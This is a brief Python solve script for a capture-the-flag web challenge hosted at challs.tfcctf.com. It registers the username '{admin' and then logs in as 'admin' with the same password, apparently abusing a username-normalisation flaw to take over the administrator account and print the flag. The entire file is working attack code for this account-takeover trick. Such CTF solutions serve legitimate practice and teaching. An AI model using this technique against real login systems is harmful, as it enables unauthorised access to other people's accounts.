#!/usr/bin/env python3
import requests, os

USERNAME, PASSWORD = "{admin", os.urandom(10).hex()
BASEURL = f"http://challs.tfcctf.com:{input('Enter the port: ')}/"
REGEX = r"TFCCTF{.*?}"

with requests.Session() as s:
    s.post(f"{BASEURL}/register", 
        data = {"username": USERNAME, "password":PASSWORD, "confirm_password":PASSWORD}            
    )
    resp = s.post(f"{BASEURL}/login", 
        data = {"username": USERNAME[1:], "password":PASSWORD}            
    )
    print(resp.text.strip())